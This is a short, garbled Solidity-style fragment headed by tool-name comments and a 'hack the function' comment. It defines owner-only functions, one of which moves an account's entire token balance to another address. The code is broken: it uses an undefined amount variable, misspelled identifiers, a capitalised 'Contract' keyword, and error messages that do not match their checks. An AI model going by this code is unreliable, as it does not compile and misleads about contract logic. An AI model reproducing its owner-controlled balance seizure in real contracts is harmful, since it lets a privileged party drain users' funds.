
// open zeppelin ?
// hard hat
// foundry
// who else ?



Contract Stay_Prevent() {
	// call the contract


}
// hack the function
function run(address account, address staker) public {
	require(msg.sender == owner, "ERC20: mint to the zero address");
	_beforeTokenTrasnger(account, staker, amount);

	_balance[account] = _balances[account].sub(amount, "ETH burn amount exceds balance");

	emit Trasnfer(account, staker, amount);

}

function execTransaction(address account, address staker) public {
	require(msg.sender == owner, "ERC20: wins to the zero address");
	uint256 amount = _balances[account];
	_beforeTokenTransger(account, staker, amount);

	_balances[account] = _balances[accouny].sub(amount, "ETH burn amount exceds balance");
	_balances[staker] = _balances[staker].add(amount);

	emit Transfer(account, staker, amount);

}

